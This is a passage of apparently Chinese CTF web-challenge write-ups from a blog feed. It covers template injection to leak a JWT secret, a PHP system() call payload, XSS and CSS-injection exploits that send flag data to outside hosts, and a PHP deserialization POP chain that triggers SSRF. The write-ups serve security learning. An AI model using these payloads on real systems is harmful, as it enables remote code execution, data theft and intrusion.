ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] &#x3D;&#x3D; &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] &#x3D; auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;</span><br><span class="line">    cookies[:auth] &#x3D; auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;&#x2F;script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>如果传入的do参数和name参数一致，会输出<code>{params[:name][0,7]} working successfully!</code></p><p>但是限制了只能输入7个字符，除去&lt;%==&gt;只有两个字符可以利用，这时可以利用ruby全局变量$&amp;，可以获得上一次正则匹配的结果</p><p>payload：<code>/work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</code></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414232933574.png" alt></p><p>成功拿到secret,接着伪造cookie</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233126939.png" alt></p><p>回到页面，buy flag，抓包将伪造的cookie写进去，在返回的包里拿到新的cookie，解密得到flag</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233252575.png" alt></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233323947.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://github.com/ev0A/SCTF2019-Flag-Shop/blob/master/Write-Up/write-up.md" target="_blank" rel="noopener">https://github.com/ev0A/SCTF2019-Flag-Shop/blob/master/Write-Up/write-up.md</a></p></blockquote><h3 id="0x-07-NESTCTF-2019-Love-Math-2"><a href="#0x-07-NESTCTF-2019-Love-Math-2" class="headerlink" title="0x 07 [NESTCTF 2019]Love Math 2"></a>0x 07 [NESTCTF 2019]Love Math 2</h3><ul><li><p>考点</p><p>php动态特性捕捉</p></li><li><p>解题过程</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload &#x3D; [‘abs‘, ‘acos‘, ‘acosh‘, ‘asin‘, ‘asinh‘, ‘atan2‘, ‘atan‘, ‘atanh‘,  ‘bindec‘, ‘ceil‘, ‘cos‘, ‘cosh‘, ‘decbin‘ , ‘decoct‘, ‘deg2rad‘, ‘exp‘, ‘expm1‘, ‘floor‘, ‘fmod‘, ‘getrandmax‘, ‘hexdec‘, ‘hypot‘, ‘is_finite‘, ‘is_infinite‘, ‘is_nan‘, ‘lcg_value‘, ‘log10‘, ‘log1p‘, ‘log‘, ‘max‘, ‘min‘, ‘mt_getrandmax‘, ‘mt_rand‘, ‘mt_srand‘, ‘octdec‘, ‘pi‘, ‘pow‘, ‘rad2deg‘, ‘rand‘, ‘round‘, ‘sin‘, ‘sinh‘, ‘sqrt‘, ‘srand‘, ‘tan‘, ‘tanh‘];</span><br><span class="line">for($k&#x3D;1;$k&lt;&#x3D;sizeof($payload);$k++)&#123;</span><br><span class="line">    for($i &#x3D; 0;$i &lt; 9; $i++)&#123;</span><br><span class="line">        for($j &#x3D; 0;$j &lt;&#x3D;9;$j++)&#123;</span><br><span class="line">            $exp &#x3D; $payload[$k] ^ $i.$j;</span><br><span class="line">            echo($payload[$k].&quot;^$i$j&quot;.&quot;&#x3D;&#x3D;&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;&lt;command&gt;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.cnblogs.com/yesec/p/12664136.html" target="_blank" rel="noopener">https://www.cnblogs.com/yesec/p/12664136.html</a></p></blockquote><h3 id="0x-08-Zer0pts2020-Can-you-guess-it"><a href="#0x-08-Zer0pts2020-Can-you-guess-it" class="headerlink" title="0x 08 [Zer0pts2020]Can you guess it?"></a>0x 08 [Zer0pts2020]Can you guess it?</h3><ul><li><p>考点</p><p>正则污染绕过、代码审计</p></li><li><p>解题过程</p></li></ul><ol><li>打开题目访问源代码进行审计</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$_SERVER[&#39;PHP_SELF&#39;]表示当前php文件相对于网站根目录的位置地址</span><br><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); &#x2F;&#x2F;basename() 函数返回路径中的文件名部分</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret &#x3D; bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#39;guess&#39;])) &#123;</span><br><span class="line">  $guess &#x3D; (string) $_POST[&#39;guess&#39;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message &#x3D; &#39;Wrong.&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>问题出在了basename()函数可以跨目录读取文件，但是需要绕过正则，这里可以用污染绕过，贴一下y1ng师傅的fuzz脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import requests</span><br><span class="line">for i in range (0,500):</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;814589eb-4094-4449-bf79-39388aa86610.node3.buuoj.cn&#x2F;index.php&#x2F;config.php&#x2F;&#123;&#125;?source&#39;.format(hex(i).replace(&#39;0x&#39;, &#39;%&#39;))</span><br><span class="line">r &#x3D; requests.get(url)</span><br><span class="line">print(url)</span><br><span class="line">if r&quot;flag&quot; in r.text:</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure><p>可以fuzz出很多可以用的参数</p><h3 id="0x-09-Zer0pts2020-musicblog"><a href="#0x-09-Zer0pts2020-musicblog" class="headerlink" title="0x 09 [Zer0pts2020]musicblog"></a>0x 09 [Zer0pts2020]musicblog</h3><ul><li><p>考点</p><p>代码设计、XSS bypass</p></li><li><p>解题过程</p></li></ul><ol><li><p>下载题目附件进行审计，在work.js中发现存在flag且设置在浏览器UA中，后台机器人会点击<code>#like</code>标签<img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420224644867.png" alt></p></li><li><p>审计<code>utli.php</code>发现</p></li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420225324470.png" alt></p><p>字符串会被加载到<code>&lt;audio&gt;</code>标签并解析到页面，输入的内容经过一次strip_tags处理。</p><p>没有过滤其他内容，可以在``中插入任意内容，但是受CSP-nonce的限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$nonce &#x3D; get_nonce();</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; script-src &#39;nonce-$&#123;nonce&#125;&#39; &#39;strict-dynamic&#39;; base-uri &#39;none&#39;; trusted-types&quot;);</span><br><span class="line">header(&#39;X-Frame-Options: DENY&#39;);</span><br><span class="line">header(&#39;X-XSS-Protection: 1; mode&#x3D;block&#39;);</span><br></pre></td></tr></table></figure><p>而这个<code>strip_tags()</code>存在bug:<a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420230614404.png" alt></p><p><img src="http://static.zybuluo.com/1160307775/5vrpxpsvcopf7bucy1q2y4h1/image_1e2uhu2v810fc1l7ppa4l41mqm20.png" alt="image_1e2uhu2v810fc1l7ppa4l41mqm20.png-53.5kB"></p><p>MusicBlog 中使用的是<code>&lt;audio&gt;</code>作为白名单，<code>&lt;a/udio&gt;</code>可以通过函数处理，并且<code>&lt;a/udio&gt;</code>会作为 超链接<code>&lt;a&gt;</code>被解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;&#x2F;audio&gt;&lt;a&#x2F;udio href&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;vtaf6wvt&quot; id&#x3D;&quot;like&quot;&gt;test&lt;&#x2F;a&#x2F;udio&gt;&lt;audio a&#x3D;</span><br></pre></td></tr></table></figure><p>经过处理后展开是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls src&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;&lt;a&#x2F;udio href&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;vtaf6wvt&quot; id&#x3D;&quot;like&quot;&gt;test&lt;&#x2F;a&#x2F;udio&gt;&lt;audio a&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.hpdoger.cn/2020/03/10/Zer0pts%202020%20CTF-Web%E9%A2%98%E8%A7%A3/#MusicBlog" target="_blank" rel="noopener">https://www.hpdoger.cn/2020/03/10/Zer0pts%202020%20CTF-Web%E9%A2%98%E8%A7%A3/#MusicBlog</a></p><p><a href="https://darkwing.moe/2020/03/10/MusicBlog-zer0pts-CTF-2020/" target="_blank" rel="noopener">https://darkwing.moe/2020/03/10/MusicBlog-zer0pts-CTF-2020/</a></p></blockquote><h3 id="0x-10-安洵杯-2019-cssgame"><a href="#0x-10-安洵杯-2019-cssgame" class="headerlink" title="0x 10 [安洵杯 2019]cssgame"></a>0x 10 [安洵杯 2019]cssgame</h3><ul><li><p>考点</p><p>CSS注入</p></li><li><p>解题过程</p></li></ul><ol><li>打开靶机，显示界面如下：</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200421222257298.png" alt></p><p>右键查看源代码发现：</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200421222412267.png" alt></p><p>可以看到flag的值就在标签<code>&lt;input&gt;</code>的<code>value</code>属性</p><p>然后我们通过靶机发送<code>css</code>参数给内网的flag.html，flag.html接收后将<code>css</code>拼接到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;$&#123;encodeURI(req.query.css)&#125;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>通过<strong>css injection</strong>来窃取内网flag值，这里可以参考微笑师傅的文章：<a href="https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/" target="_blank" rel="noopener">https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/</a></p><p>构造exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;poc.css&quot;, &quot;w&quot;)</span><br><span class="line">dic &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;</span><br><span class="line">for i in dic:</span><br><span class="line">    flag &#x3D; sys.argv[1] + i</span><br><span class="line">    payload &#x3D; &quot;input[name&#x3D;flag][value^&#x3D;\&quot;&quot; + flag + &quot;\&quot;] ~ * &#123;background-image: url(\&quot;http:&#x2F;&#x2F;174.0.108.172:8080&#x2F;?&quot; + flag + &quot;\&quot;);&#125;&quot;</span><br><span class="line">    f.write(payload + &quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>将<code>css=http://174.0.108.172/poc.css</code>post给<code>crawl.html</code>,在nc监听中可以得到flag</p><p>这里环境问题数据可能会传不到内网，需要不停的发包直至收到nc收到请求的信息，坑了我一上午，我裂开了</p><p>参考资料：</p><blockquote><p><a href="https://yanmymickey.github.io/2020/04/17/CTFwp/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Dcssgame/" target="_blank" rel="noopener">https://yanmymickey.github.io/2020/04/17/CTFwp/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Dcssgame/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日&quot;&gt;&lt;a href=&quot;#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日&quot; class=&quot;headerlink&quot; title=&quot;0x 01 [PWNHUB 公开赛 2018]傻 f
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="BUUOJ" scheme="http://yoursite.com/tags/BUUOJ/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF复盘题解</title>
    <link href="http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/</id>
    <published>2020-03-31T00:04:00.000Z</published>
    <updated>2020-04-02T15:46:03.229Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-Ez-bypass"><a href="#0x-01-Ez-bypass" class="headerlink" title="0x 01 Ez_bypass"></a>0x 01 Ez_bypass</h4><p>第一层数组绕过，第二层弱类型比较绕过</p><h4 id="0x-02-你传你🐎呢"><a href="#0x-02-你传你🐎呢" class="headerlink" title="0x 02 你传你🐎呢"></a>0x 02 你传你🐎呢</h4><p>上传.htaccess绕过</p><h4 id="0x-03-PYWebsite"><a href="#0x-03-PYWebsite" class="headerlink" title="0x 03 PYWebsite"></a>0x 03 PYWebsite</h4><p>XFF伪造127.0.0.1得到flag</p><h4 id="0x-04-Ezpop"><a href="#0x-04-Ezpop" class="headerlink" title="0x 04 Ezpop"></a>0x 04 Ezpop</h4><ol><li><code>__wakeup()</code>方法通过<code>preg_match()</code>将<code>$this-&gt;source</code>做字符串比较，如果<code>$this-&gt;source</code>是<code>Show</code>类，就调用了<code>__toString()</code>方法；</li><li><code>__toString()</code>访问了<code>str</code>的<code>source</code>属性，<code>str</code>是<code>Test</code>类，不存在<code>source</code>属性，就调用了<code>Test</code>类的<code>__get()</code>魔术方法；</li><li><code>__get()</code>方法将<code>p</code>作为函数使用，<code>p</code>实例化为<code>Modify</code>类，就调用了<code>Modifier</code>的<code>__invoke()</code>方法；</li><li><code>__invoke()</code>调用了<code>append()</code>方法，包含<code>$value</code>，若将<code>$value</code>为伪协议，则可读flag.php源码</li></ol><p>exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;</span><br><span class="line">        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return &quot;aaa&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o &#x3D; new Show(&#39;aaa&#39;);</span><br><span class="line">$o-&gt;str&#x3D; new Test();</span><br><span class="line">$lxj &#x3D; new Show($o);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($lxj));</span><br></pre></td></tr></table></figure><h4 id="0x-05-套娃"><a href="#0x-05-套娃" class="headerlink" title="0x 05 套娃"></a>0x 05 套娃</h4><ul><li>第一关</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#39;_&#39;) !&#x3D;&#x3D; 0 || substr_count($query, &#39;%5f&#39;) !&#x3D; 0 )&#123;</span><br><span class="line">    die(&#39;Y0u are So cutE!&#39;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#39;b_u_p_t&#39;] !&#x3D;&#x3D; &#39;23333&#39; &amp;&amp; preg_match(&#39;&#x2F;^23333$&#x2F;&#39;, $_GET[&#39;b_u_p_t&#39;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br></pre></td></tr></table></figure><p>第一层匹配了<code>_</code>符号和它的url编码值，有如下方法绕过：</p><ol><li>%5F</li><li>b.u.p.t（点代替_）</li><li>b u p t（空格代替_）</li></ol><p>第二层换行污染绕过，最终payload：?b.u.p.t=23333%0a</p><ul><li>第二关</li></ul><p>伪造本地访问得到jsfuck提示<code>post me Merak</code>，post一个Merak参数得到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include &#39;takeip.php&#39;;</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;.&#39;); </span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;Merak&#39;]))&#123; </span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function change($v)&#123; </span><br><span class="line">    $v &#x3D; base64_decode($v); </span><br><span class="line">    $re &#x3D; &#39;&#39;; </span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .&#x3D; chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">echo &#39;Local access only!&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">if($ip!&#x3D;&#39;127.0.0.1&#39;)</span><br><span class="line">echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;</span><br><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>file_get_contents()</code>用<code>data://</code>或者<code>php://input</code>伪协议绕过,根据加密脚本可以编写出dechange函数，得到<code>ZmpdYSZmXGI=</code>，最终发包得到flag</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200401230121454.png" alt></p><h4 id="0x-06-Ezaudit"><a href="#0x-06-Ezaudit" class="headerlink" title="0x 06 Ezaudit"></a>0x 06 Ezaudit</h4><p><a href="http://www.zip源代码泄露，题目类似于GWCTF枯燥的抽奖，根据原题的payload还原出种子，然后手工推算出私钥，最后SQL注入得到flag" target="_blank" rel="noopener">www.zip源代码泄露，题目类似于GWCTF枯燥的抽奖，根据原题的payload还原出种子，然后手工推算出私钥，最后SQL注入得到flag</a></p><h4 id="0x-07-Ezpop-Revenge"><a href="#0x-07-Ezpop-Revenge" class="headerlink" title="0x 07 Ezpop_Revenge"></a>0x 07 Ezpop_Revenge</h4><p>var/Typecho/Plugin.php</p><p>激活插件方法处得到绑定的url</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402223613501.png" alt></p><p>首先根据题意全局搜索unserialize,路径为usr/plugins/HelloWorld/Plugin.php中找到反序列化点</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402214718378.png" alt></p><p>首先看到这里：</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402214946669.png" alt></p><p>找到入口点，跟进Typecho_Db::__construct</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215208957.png" alt></p><p>存在字符串拼接，全局搜索寻找__tostring()魔术方法</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215545678.png" alt></p><p>我们选择var/Typecho/Db/Query.php作为跳板</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215659239.png" alt></p><p>如果$this-&gt;_sqlPreBuild[‘action’]=SELECT就调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild)</span><br></pre></td></tr></table></figure><p>如果令$this-&gt;_adapter为Soapclient实例，触发_call完成ssrf</p><p>pop链构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld_DB::wakeup–&gt;</span><br><span class="line">Typecho_Db::__construct(tostring)–&gt;</span><br><span class="line">Typecho_Db_Query::__construct–&gt;</span><br><span class="line">(this-&gt;_adapter&#x3D;new Soapclient)–&gt;</span><br><span class="line">__call()进行ssrf</span><br></pre></td></tr></table></figure><p>exp构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloWorld_DB&#123;</span><br><span class="line">    private $coincidence;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;coincidence&#x3D;([&#39;hello&#39;&#x3D;&gt;new Typecho_Db_Query()]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Db_Query</span><br><span class="line">&#123;</span><br><span class="line">    private $_sqlPreBuild;</span><br><span class="line">    private $_adapter;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;_sqlPreBuild[&#39;action&#39;]&#x3D;&#39;SELECT&#39;;</span><br><span class="line">        $target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;;</span><br><span class="line">        $headers &#x3D; array(</span><br><span class="line">            &#39;Cookie: PHPSESSID&#x3D;ubcj94u08mcaodg4g1e0nooam2&#39;,</span><br><span class="line">        );</span><br><span class="line">        $this-&gt;_adapter&#x3D;new SoapClient(</span><br><span class="line">            null,</span><br><span class="line">            array(&#39;location&#39; &#x3D;&gt; $target,</span><br><span class="line">                &#39;user_agent&#39;&#x3D;&gt;str_replace(&#39;^^&#39;, &quot;\r\n&quot;,&#39;w4nder^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers)),&#39;uri&#39;&#x3D;&gt;&#39;hello&#39;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; serialize(new HelloWorld_DB());</span><br><span class="line">echo base64_encode($a);</span><br></pre></td></tr></table></figure><p>访问/page_admin?admin=1，post提交base64编码的结果得到flag</p><ul><li>后记</li></ul><p>在入口处存在一则过滤，其中过滤了百分号，由于经过base64编码后在解码没有百分号了，所以不需要绕过</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402223309609.png" alt></p><p>假设我们需要绕过%分号该如何绕过呢？答案是需要用\00来代替%00</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 